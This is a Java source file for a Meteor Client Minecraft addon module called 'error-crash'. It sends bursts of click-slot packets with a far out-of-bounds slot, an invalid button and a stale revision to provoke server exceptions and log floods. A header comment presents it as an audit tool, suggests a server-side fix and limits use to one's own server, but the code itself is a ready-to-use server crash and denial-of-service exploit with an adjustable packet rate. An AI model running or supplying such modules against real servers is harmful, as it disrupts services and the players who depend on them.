package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

/**
 * AUDIT: Error Crash (malformed click parameters → server exception)
 *
 * Sends ClickSlotC2SPacket with: slot = 2957234 (far OOB), button = 99
 * (not a valid hotbar key or mouse button), and revision = 123344 (stale).
 * A click handler that bounds-checks these parameters only inside business
 * logic (after list access) can throw an ArrayIndexOutOfBoundsException or
 * NullPointerException that either crashes a thread or produces an error
 * stack trace on each packet — N packets/tick = N stack traces/tick.
 *
 * The server must handle every malformed packet gracefully: validate all
 * parameters at the entry point of the handler, never inside business logic,
 * and send a graceful reject/resync instead of propagating an exception.
 *
 * Patch signal: validate slot ∈ [0, handler.size), button ∈ valid set for
 * the given SlotActionType, and revision ≤ current at the very start of the
 * click handler; reject without exception, never let bad input reach world
 * state or inventory mutation code.
 *
 * Requires an open container. Run against your OWN local server only.
 */
public class ErrorCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(15).min(1).sliderMax(100).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public ErrorCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "error-crash",
            "Sends click-slot packets with invalid slot/button indices to trigger server-side exceptions.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.player.currentScreenHandler == null) return;
        ticksActive++;
        for (int i = 0; i < amount.get(); i++) {
            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                mc.player.currentScreenHandler.syncId, 123344,
                (short) 2957234, (byte) 99,
                SlotActionType.PICKUP, new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
